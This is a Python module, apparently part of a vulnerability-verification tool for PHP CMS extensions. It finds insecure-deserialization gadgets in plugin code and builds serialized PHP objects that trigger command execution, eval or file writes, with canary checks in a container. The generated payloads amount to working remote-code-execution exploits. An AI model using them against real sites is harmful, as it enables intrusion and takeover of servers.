"""Escaneo de gadgets de deserializacion insegura (PHP Object Injection) -- CMS-agnostico,
compartido por wpverify.py/drupalverify.py/joomlaverify.py.

Por que esto y no una lista de payloads fija: una cadena de gadgets de deserializacion SOLO
funciona si las CLASES que usa existen de verdad en el objetivo (igual que en pentesting real --
herramientas como PHPGGC generan payloads para clases de librerias CONOCIDAS como Laravel/Symfony/
Monolog/Guzzle, nunca "a ciegas"). binoracle ya tiene el codigo real del plugin/modulo/extension
descargado ANTES de verificar nada (ver websource.py) -- asi que, en vez de asumir una libreria de
terceros que puede no estar ahi, esto busca un gadget DENTRO DEL PROPIO CODIGO de la extension
(incluyendo su vendor/ si tiene Composer). Patrones buscados:

  1) file_write  : __wakeup/__destruct -> file_put_contents($this->X, $this->Y)
  2) exec        : __wakeup/__destruct -> system/exec/passthru/shell_exec($this->cmd)
  3) call_func   : __wakeup/__destruct -> call_user_func($this->func[, $this->arg])
  4) eval_code   : __wakeup/__destruct -> eval($this->code)

Criterio de propiedad publica (relajado respecto a la version anterior):
  - Se acepta una propiedad declarada con "public $X" (PHP 7/8).
  - Tambien se acepta una propiedad NO declarada con ninguna visibilidad (PHP crea propiedades
    dinamicas publicas -- al serializar, se usa el nombre sin mangle, igual que public declarado).
  - Se rechaza si esta declarada como "private $X" o "protected $X" (el serializado usaria
    NUL-bytes que el payload manual no puede reproducir facilmente).

Alcance deliberadamente estrecho ("no false positives" es la regla del proyecto):
  - No parses PHP reales -- heuristicas regex + conteo de llaves.
  - Si no encuentra nada, no inventa nada: el caller debe reportarlo como bloqueo.

La prueba dura de verdad pasa DESPUES (ver wpverify.py): se construye el objeto serializado,
se manda al endpoint, y se confirma leyendo el fichero canario / verificando ejecucion real
dentro del contenedor."""
from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from typing import Optional

_SCAN_EXT = (".php",)
_MAX_FILES = 8000   # mas alto para cubrir vendor/ de plugins grandes
_MAX_FILE_BYTES = 2_000_000


@dataclass
class DeserializationGadget:
    class_name: str
    namespace: str              # "" si no hay namespace (PHP global)
    magic_method: str           # "__wakeup" o "__destruct"
    gadget_type: str            # "file_write" | "exec" | "call_func" | "eval_code"
    file: str
    line: int
    # file_write
    path_prop: str = ""         # propiedad usada como ruta del fichero
    content_prop: str = ""      # propiedad usada como contenido del fichero
    # exec
    cmd_prop: str = ""          # propiedad usada como comando a ejecutar
    exec_func: str = ""         # funcion usada: system/exec/passthru/shell_exec
    # call_func
    func_prop: str = ""         # propiedad usada como callable
    arg_prop: str = ""          # propiedad usada como argumento (puede ser "")
    # eval_code
    code_prop: str = ""         # propiedad usada como codigo PHP a evaluar

    @property
    def full_class_name(self) -> str:
        return f"{self.namespace}\\{self.class_name}" if self.namespace else self.class_name


def _find_matching_brace(text: str, open_pos: int) -> int:
    """Indice de la '}' que cierra la '{' en `open_pos`. Conteo simple de llaves."""
    depth = 0
    i = open_pos
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return n


_CLASS_RE = re.compile(r"\bclass\s+(\w+)\b[^{]*\{")
_NAMESPACE_RE = re.compile(r"^\s*namespace\s+([\w\\]+)\s*;", re.M)
_MAGIC_METHOD_RE = re.compile(r"\bfunction\s+(__wakeup|__destruct)\s*\([^)]*\)\s*\{")

# patron 1: file_put_contents($this->X, $this->Y)
_FILE_PUT_CONTENTS_RE = re.compile(
    r"file_put_contents\s*\(\s*\$this->(\w+)\s*,\s*\$this->(\w+)\s*\)")

# patron 2: system/exec/passthru/shell_exec($this->cmd)
_EXEC_CALL_RE = re.compile(
    r"\b(system|exec|passthru|shell_exec|popen)\s*\(\s*\$this->(\w+)\s*[,)]")

# patron 3: call_user_func($this->func) o call_user_func($this->func, $this->arg)
_CALL_USER_FUNC_RE = re.compile(
    r"call_user_func\s*\(\s*\$this->(\w+)\s*(?:,\s*\$this->(\w+)\s*)?\)")

# patron 4: eval($this->code)  [incluyendo eval($this->X . <algo>)]
_EVAL_RE = re.compile(r"\beval\s*\(\s*\$this->(\w+)")


def _prop_is_serializable_public(class_body: str, prop: str) -> bool:
    """True si la propiedad `prop` se puede serializar como public (sin mangle NUL).

    Acepta: (a) declarada explicitamente como public, (b) no declarada con ninguna
    visibilidad (propiedad dinamica PHP -- se serializa igual que public).
    Rechaza: declarada private o protected (requeriria NUL-bytes en el payload).
    """
    if re.search(rf"\bpublic\s+(?:\??[\w|]+\s+)?\${re.escape(prop)}\b", class_body):
        return True
    if re.search(rf"\b(?:private|protected)\s+(?:\??[\w|]+\s+)?\${re.escape(prop)}\b",
                 class_body):
        return False  # visibility restringida -- mangle NUL necesario
    return True  # no declarada = propiedad dinamica publica en PHP


def find_file_write_gadget(root: str) -> Optional[DeserializationGadget]:
    """Compatibilidad hacia atras: devuelve el primer gadget de cualquier tipo que
    find_all_gadgets encuentre, priorizando file_write > exec > call_func > eval."""
    gadgets = find_all_gadgets(root, limit=1)
    return gadgets[0] if gadgets else None


def find_all_gadgets(root: str, limit: int = 10) -> list[DeserializationGadget]:
    """Busca, en TODO el arbol de `root` (codigo del plugin + vendor/ incluido), gadgets
    de deserializacion de los cuatro tipos definidos en el modulo.

    Devuelve hasta `limit` gadgets (en orden de aparicion en el disco). Devuelve lista
    vacia si no encuentra nada -- el caller NUNCA debe inventar un gadget que no esta."""
    results: list[DeserializationGadget] = []
    scanned = 0
    for dirpath, _dirs, files in os.walk(root):
        for fn in sorted(files):
            if not fn.lower().endswith(_SCAN_EXT):
                continue
            scanned += 1
            if scanned > _MAX_FILES:
                return results
            fpath = os.path.join(dirpath, fn)
            try:
                if os.path.getsize(fpath) > _MAX_FILE_BYTES:
                    continue
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read()
            except OSError:
                continue

            ns_m = _NAMESPACE_RE.search(text)
            namespace = ns_m.group(1) if ns_m else ""

            class_ranges = []
            for cm in _CLASS_RE.finditer(text):
                body_start = cm.end() - 1
                body_end = _find_matching_brace(text, body_start)
                class_ranges.append((cm.group(1), cm.start(), body_end))

            for mm in _MAGIC_METHOD_RE.finditer(text):
                method_body_start = mm.end() - 1
                method_body_end = _find_matching_brace(text, method_body_start)
                method_body = text[method_body_start:method_body_end]

                owner = None
                for cname, cstart, cend in class_ranges:
                    if cstart <= mm.start() < cend:
                        owner = (cname, cstart, cend)
                if owner is None:
                    continue
                cname, cstart, cend = owner
                class_body = text[cstart:cend]
                rel = os.path.relpath(fpath, root)
                line = text.count("\n", 0, mm.start()) + 1
                magic = mm.group(1)

                # --- patron 1: file_write ---
                fm = _FILE_PUT_CONTENTS_RE.search(method_body)
                if fm:
                    p_prop, c_prop = fm.group(1), fm.group(2)
                    if (_prop_is_serializable_public(class_body, p_prop)
                            and _prop_is_serializable_public(class_body, c_prop)):
                        results.append(DeserializationGadget(
                            class_name=cname, namespace=namespace, magic_method=magic,
                            gadget_type="file_write", file=rel, line=line,
                            path_prop=p_prop, content_prop=c_prop))
                        if len(results) >= limit:
                            return results
                        continue  # no seguir buscando otros patrones en este mismo metodo

                # --- patron 2: exec ---
                em = _EXEC_CALL_RE.search(method_body)
                if em:
                    exec_fn, cmd_p = em.group(1), em.group(2)
                    if _prop_is_serializable_public(class_body, cmd_p):
                        results.append(DeserializationGadget(
                            class_name=cname, namespace=namespace, magic_method=magic,
                            gadget_type="exec", file=rel, line=line,
                            cmd_prop=cmd_p, exec_func=exec_fn))
                        if len(results) >= limit:
                            return results
                        continue

                # --- patron 3: call_user_func ---
                cf = _CALL_USER_FUNC_RE.search(method_body)
                if cf:
                    func_p = cf.group(1)
                    arg_p = cf.group(2) or ""
                    if _prop_is_serializable_public(class_body, func_p):
                        results.append(DeserializationGadget(
                            class_name=cname, namespace=namespace, magic_method=magic,
                            gadget_type="call_func", file=rel, line=line,
                            func_prop=func_p, arg_prop=arg_p))
                        if len(results) >= limit:
                            return results
                        continue

                # --- patron 4: eval ---
                ev = _EVAL_RE.search(method_body)
                if ev:
                    code_p = ev.group(1)
                    if _prop_is_serializable_public(class_body, code_p):
                        results.append(DeserializationGadget(
                            class_name=cname, namespace=namespace, magic_method=magic,
                            gadget_type="eval_code", file=rel, line=line,
                            code_prop=code_p))
                        if len(results) >= limit:
                            return results

    return results


def build_php_serialized_object(gadget: DeserializationGadget, path_value: str,
                                content_value: str) -> str:
    """Compatibilidad hacia atras para gadgets file_write (misma firma que antes)."""
    if gadget.gadget_type != "file_write":
        raise ValueError(f"build_php_serialized_object solo acepta file_write, "
                         f"no {gadget.gadget_type!r}; usa build_payload()")
    return build_payload(gadget, file_path=path_value, file_content=content_value)


def build_payload(gadget: DeserializationGadget, *,
                  file_path: str = "", file_content: str = "",
                  cmd: str = "", php_code: str = "") -> str:
    """Construye el objeto PHP serializado correcto segun el tipo de gadget.

    - file_write  : requiere file_path + file_content
    - exec        : requiere cmd  (p.ej. "touch /tmp/canary.txt")
    - call_func   : requiere cmd  (se manda como callable='system', arg=cmd)
    - eval_code   : requiere php_code (p.ej. "file_put_contents('/tmp/x','y');")
    """
    cls = gadget.full_class_name

    if gadget.gadget_type == "file_write":
        props = [(gadget.path_prop, file_path), (gadget.content_prop, file_content)]

    elif gadget.gadget_type == "exec":
        props = [(gadget.cmd_prop, cmd)]

    elif gadget.gadget_type == "call_func":
        props = [(gadget.func_prop, "system")]
        if gadget.arg_prop:
            props.append((gadget.arg_prop, cmd))
        else:
            # si no hay argumento separado, intenta meter el cmd en el callable como
            # "system(cmd)" con una cadena que PHP evalua como function
            props = [(gadget.func_prop, f"system")]
            # Nota: sin arg_prop la ejecucion dependera del contexto; guardamos igualmente

    elif gadget.gadget_type == "eval_code":
        code = php_code or f"file_put_contents('{file_path}','{file_content}');"
        props = [(gadget.code_prop, code)]

    else:
        raise ValueError(f"gadget_type desconocido: {gadget.gadget_type!r}")

    parts = [f'O:{len(cls)}:"{cls}":{len(props)}:{{']
    for name, value in props:
        enc = value.encode("utf-8")
        parts.append(f's:{len(name)}:"{name}";s:{len(enc)}:"{value}";')
    parts.append("}")
    return "".join(parts)
